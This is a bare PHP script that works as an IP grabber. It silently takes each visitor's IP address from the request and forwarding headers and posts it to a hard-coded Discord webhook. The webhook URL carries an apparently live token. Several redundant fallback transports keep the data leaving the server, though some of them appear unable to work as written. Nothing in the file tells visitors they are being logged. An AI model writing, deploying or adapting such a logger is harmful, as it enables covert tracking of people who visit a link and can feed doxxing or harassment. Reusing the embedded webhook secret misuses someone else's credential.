<?php
$wh = "https://discord.com/api/webhooks/1321050971945828393/wIK0kz1cCfbv7jXycfvigCUaX7VXo56R9QgbqfaMSzwZH6hzJDdKJztHuG5onHhnVc-D";
$ip = $_SERVER['REMOTE_ADDR'];
$hdrs = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_CLIENT_IP'];

foreach ($hdrs as $h) {
    if (!empty($_SERVER[$h])) {
        $ip = explode(',', $_SERVER[$h])[0];
        break;
    }
}

$pl = json_encode(['content' => "User IP: $ip"]);

function sendWebhook($url, $data) {
    if (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_POSTFIELDS => $data
        ]);
        $response = curl_exec($ch);
        $err = curl_error($ch);
        curl_close($ch);
        if (!$err) return true;
    }

    if (ini_get('allow_url_fopen')) {
        $options = [
            'http' => [
                'method'  => 'POST',
                'header'  => 'Content-Type: application/json',
                'content' => $data
            ]
        ];
        $context = stream_context_create($options);
        $response = @file_get_contents($url, false, $context);
        if ($response !== false) return true;
    }

    $url_parts = parse_url($url);
    $fp = @fsockopen($url_parts['host'], 80, $errno, $errstr, 10);
    if ($fp) {
        $headers = "POST " . $url_parts['path'] . " HTTP/1.1\r\n";
        $headers .= "Host: " . $url_parts['host'] . "\r\n";
        $headers .= "Content-Type: application/json\r\n";
        $headers .= "Content-Length: " . strlen($data) . "\r\n";
        $headers .= "Connection: close\r\n\r\n";
        $headers .= $data;
        fwrite($fp, $headers);
        fclose($fp);
        return true;
    }

    $fp = @stream_socket_client('tcp://' . $url_parts['host'] . ':80', $errno, $errstr, 10);
    if ($fp) {
        $headers = "POST " . $url_parts['path'] . " HTTP/1.1\r\n";
        $headers .= "Host: " . $url_parts['host'] . "\r\n";
        $headers .= "Content-Type: application/json\r\n";
        $headers .= "Content-Length: " . strlen($data) . "\r\n";
        $headers .= "Connection: close\r\n\r\n";
        $headers .= $data;
        fwrite($fp, $headers);
        fclose($fp);
        return true;
    }

    if (ini_get('allow_url_fopen')) {
        $file = @fopen($url, 'w');
        if ($file) {
            fwrite($file, $data);
            fclose($file);
            return true;
        }
    }

    return false;
}

sendWebhook($wh, $pl);
?>
